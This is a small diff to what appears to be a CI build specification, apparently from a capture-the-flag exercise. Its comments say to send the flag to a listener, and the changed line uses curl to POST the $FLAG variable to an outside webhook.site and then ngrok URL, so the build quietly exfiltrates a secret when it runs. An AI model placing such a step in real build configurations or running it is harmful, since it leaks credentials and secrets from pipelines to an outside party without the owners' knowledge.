@@ -8,4 +8,4 @@ phases:
       
       # 2. Send the flag to your listener
       # Replace <YOUR_URL> with your actual webhook.site or ngrok URL
-      - curl -X POST https://webhook.site/16bd594a-76dc-40fc-94ac-19865b1a7aae --data "flag=$FLAG"
+      - curl -X POST https://ace-balneological-undaintily.ngrok-free.dev --data "flag=$FLAG"
